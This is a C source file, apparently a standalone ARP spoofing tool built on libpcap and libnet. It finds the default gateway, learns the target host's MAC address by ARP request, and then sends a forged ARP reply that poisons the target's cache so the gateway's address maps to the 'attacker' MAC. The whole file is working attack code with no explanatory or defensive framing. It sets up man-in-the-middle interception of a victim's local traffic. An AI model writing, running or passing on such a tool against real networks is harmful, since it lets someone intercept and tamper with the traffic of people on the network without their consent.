#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <libnet.h>

/* This macro is used in the sniffing filter */
#define PCAP_NETMASK_UNKNOWN    0xffffffff

struct etherhdr {
    u_int8_t  ether_dhost[ETHER_ADDR_LEN];  /* destination eth addr */
    u_int8_t  ether_shost[ETHER_ADDR_LEN];  /* source ether addr    */
    u_int16_t ether_type;                   /* packet type ID */
};

struct arphdr {
    unsigned short int ar_hrd;      /* format of hardware address.  */
    unsigned short int ar_pro;      /* format of protocol address.  */
    unsigned char ar_hln;           /* length of hardware address.  */
    unsigned char ar_pln;           /* length of protocol address.  */
    unsigned short int ar_op;       /* operation type  */
};

struct ether_arp {
    struct  arphdr ea_hdr;              /* fixed-size header */
    u_int8_t arp_sha[ETHER_ADDR_LEN];   /* sender hardware address */
    u_int8_t arp_spa[4];                /* sender protocol address */
    u_int8_t arp_tha[ETHER_ADDR_LEN];   /* target hardware address */
    u_int8_t arp_tpa[4];                /* target protocol address */
};


pcap_t *handle; //pcap handle
libnet_t *lc; //libnet context

u_int32_t ip, ip_target, ip_gateway; //sender ip, target ip, gateway ip

struct libnet_ether_addr *mac, mac_target; //sender mac, target mac

static void arp_hdr_init (void);
void get_tmac (u_int32_t, struct libnet_ether_addr *);
void process_packet (u_char *, const struct pcap_pkthdr *, const u_char *);
void spoof (u_int32_t, u_int32_t, struct libnet_ether_addr, struct libnet_ether_addr *);

int main (int argc, char *argv[])
{
    char *device = NULL;
    char *filter = "arp";
    char errbuf[LIBNET_ERRBUF_SIZE];
    int c, s; //for error handling
    struct bpf_program fp; //compiled filter

    char gwIP[15];
    FILE *gwIPfp;

    errbuf[0] = 0;

    if ((lc = libnet_init (LIBNET_LINK, device, errbuf)) == NULL) {
        fprintf (stderr, "initializing session error\n%s", errbuf);
        exit (1);
    }

    if ((ip_target = libnet_name2addr4 (lc, argv[1], LIBNET_RESOLVE)) == -1) {
        fprintf (stderr, "converting %s to IPv4 failed\n%s", argv[1], libnet_geterror (lc));
        exit (1);
    }

    gwIPfp = popen("ip route show default | grep default | awk '{print $3}'","r");
    fgets(gwIP, 15, gwIPfp);

    if ((ip_gateway = libnet_name2addr4 (lc, gwIP, LIBNET_RESOLVE)) == -1) {
        fprintf (stderr, "converting gateway to IPv4 failed %s.\n%s", gwIP, libnet_geterror (lc));
        exit (1);
    }

    if ((mac = libnet_get_hwaddr(lc)) == NULL) {
        fprintf (stderr, "getting MAC address from device failed\n%s", libnet_geterror (lc));
        exit (1);
    }

    if ((ip = libnet_get_ipaddr4(lc)) == -1) {
        fprintf (stderr, "getting IP address from device failed\n%s", libnet_geterror (lc));
        exit (1);
    }

    // get device
    if (lc == NULL) {
        device = NULL;
        fprintf (stderr, "Device is NULL.");
    } else {
        device = lc->device;
    }

    /* configuring the sniffing interface */
    if ((handle = pcap_open_live (device, 1500, 0, 2000, errbuf)) == NULL) {
        fprintf (stderr, "An error occurred while opening the device.\n%s", errbuf);
        exit (1);
    }

    if (pcap_datalink (handle) != DLT_EN10MB) {
        fprintf (stderr, "This program only supports Ethernet cards!\n");
        exit (1);
    }

    /* Compiling the filter for ARP packet only */
    if (pcap_compile (handle, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf (stderr, "%s", pcap_geterr (handle));
        exit (1);
    }

    /* Setting the filter for the sniffing session */
    if (pcap_setfilter (handle, &fp) == -1) {
        fprintf (stderr, "%s", pcap_geterr (handle));
        exit (1);
    }

    pcap_freecode (&fp); //free the BPF program
    get_tmac (ip, mac); //get MAC of target
    spoof (ip_target, ip_gateway, mac_target, mac); //spoof!

    pcap_close (handle);
    libnet_destroy (lc);
    return 0;
}

void get_tmac (u_int32_t ip, struct libnet_ether_addr *mac) {

    libnet_ptag_t arp = 0, eth = 0; /* Libnet protocol tag */
    u_int8_t broadcast_ether[6];    /* Ethernet broadcast address */
    int s;                          /* Generic value for error handling */

    memset(broadcast_ether, 0xff, ETHER_ADDR_LEN);  /* MAC destination set to ff:ff:ff:ff:ff:ff */

    arp = libnet_autobuild_arp ( ARPOP_REQUEST, //arp request
                                 (u_int8_t *) mac, //attacker mac
                                 (u_int8_t *) &ip, //attacker ip
                                 (u_int8_t *) broadcast_ether, //set to broadcast
                                 (u_int8_t *) &ip_target, //target ip
                                 lc); //libnet context

    if (arp == -1) {
        fprintf (stderr, "ARP header build error\n%s\n", libnet_geterror (lc));
        exit (1);
    }

    eth = libnet_build_ethernet (   (u_int8_t *) broadcast_ether, //set to broadcast
                                    (u_int8_t *) mac, //attacker mac
                                    ETHERTYPE_ARP, // 0x8006
                                    NULL, // noo payload
                                    0, //no payload
                                    lc, // libnet context
                                    0); //no libnet protocol tag

    if (eth == -1) {
        fprintf (stderr, "Ethernet header build error.\n%s\n", libnet_geterror (lc));
        exit (1);
    }

    /* Send the Ethernet packet with the ARP request embedded */
    if ((libnet_write (lc)) == -1) {
        fprintf (stderr, "Packet to get MAC not sent\n%s\n", libnet_geterror (lc));
        exit (1);
    }

    printf ("Looking for the MAC address of %s...\n", libnet_addr2name4 (ip_target, LIBNET_DONT_RESOLVE));

    /* loop to look for reply and process ARP packet in process_packet() */
    if ((s = pcap_loop (handle, -1, process_packet, NULL)) < 0) {
        if (s == -1) {
            fprintf (stderr, "%s", pcap_geterr (handle));
            exit (1);
        }
    }

    libnet_clear_packet (lc);
}

void process_packet (u_char *user, const struct pcap_pkthdr *header, const u_char * packet)
{
    struct etherhdr *eth_header;
    struct ether_arp *arp_packet;

    eth_header = (struct etherhdr *) packet;

    if (ntohs (eth_header->ether_type) == ETHERTYPE_ARP)
    {
        arp_packet = (struct ether_arp *) (packet + (ETHER_ADDR_LEN+ETHER_ADDR_LEN+2));

        /* Check if the ARP packet is an ARP reply from the target */
        if (ntohs (arp_packet->ea_hdr.ar_op) == 2 && !memcmp (&ip_target, arp_packet->arp_spa, 4))
        {
            memcpy (mac_target.ether_addr_octet, eth_header->ether_shost, 6);

            printf ("Target: %d.%d.%d.%d is at: %02x:%02x:%02x:%02x:%02x:%02x\n",
                    arp_packet->arp_spa[0],
                    arp_packet->arp_spa[1],
                    arp_packet->arp_spa[2],
                    arp_packet->arp_spa[3],

                    mac_target.ether_addr_octet[0],
                    mac_target.ether_addr_octet[1],
                    mac_target.ether_addr_octet[2],
                    mac_target.ether_addr_octet[3],
                    mac_target.ether_addr_octet[4],
                    mac_target.ether_addr_octet[5]);

            pcap_breakloop (handle);
        }
    }
}

void spoof (u_int32_t ip_target, u_int32_t ip_spoof, struct libnet_ether_addr mac_target, struct libnet_ether_addr *mac)
{
    libnet_ptag_t arp = 0, eth = 0; /* Libnet protocol tag */
    int s;                          /* Generic value for error handling */

    arp = libnet_autobuild_arp (    ARPOP_REPLY, //arp reply
                                    (u_int8_t *) mac, //attacker mac
                                    (u_int8_t *) &ip_spoof, //gateway ip
                                    (u_int8_t *) &mac_target, //target mac
                                    (u_int8_t *) &ip_target, //target ip
                                    lc); // libnet context

    if (arp == -1) {
        fprintf (stderr, "ARP header build error %s\n", libnet_geterror (lc));
        exit (1);
    }

    eth = libnet_build_ethernet (   (u_int8_t *) &mac_target, //target mac
                                    (u_int8_t *) mac, //attacker mac
                                    ETHERTYPE_ARP, //0x8006
                                    NULL, // no payload
                                    0, //no payload
                                    lc, // libnet context
                                    0); //no libnet protocol tag

    if (eth == -1) {
        fprintf (stderr, "Ehternet header build error\n%s\n", libnet_geterror (lc));
        exit (1);
    }

    /* Send the Ethernet packet with the ARP request embedded */
    if ((libnet_write (lc)) == -1) {
        fprintf (stderr, "Spoofing packet not sent\n%s\n", libnet_geterror (lc));
        exit (1);
    }
    else
        printf("Target Spoofed!\n");

    libnet_clear_packet (lc);
}
